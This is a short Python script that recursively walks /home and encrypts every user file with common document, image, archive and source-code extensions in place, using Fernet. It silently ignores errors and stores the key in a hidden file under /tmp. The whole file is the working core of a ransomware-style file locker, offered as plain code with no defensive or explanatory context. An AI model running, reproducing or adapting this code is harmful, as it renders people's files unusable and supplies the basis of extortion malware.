import os
from cryptography.fernet import Fernet

KEY_FILE = "/tmp/.shadow_key"

def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, 'wb') as f:
        f.write(key)
    return key

def encrypt_files(start_path="/home"):
    key = generate_key()
    fernet = Fernet(key)
    extensions = ['.txt', '.docx', '.jpg', '.jpeg', '.png', '.pdf', '.zip', '.rar', '.py', '.sh', '.c', '.cpp', '.json']
    count = 0
    for root, dirs, files in os.walk(start_path):
        if any(skip in root for skip in ['/proc', '/sys', '/dev', '/tmp', '/var']):
            continue
        for file in files:
            if any(file.endswith(ext) for ext in extensions):
                filepath = os.path.join(root, file)
                try:
                    with open(filepath, 'rb') as f:
                        data = f.read()
                    encrypted = fernet.encrypt(data)
                    with open(filepath, 'wb') as f:
                        f.write(encrypted)
                    count += 1
                except:
                    pass
    return f"Encrypted {count} files | Key saved to {KEY_FILE}"
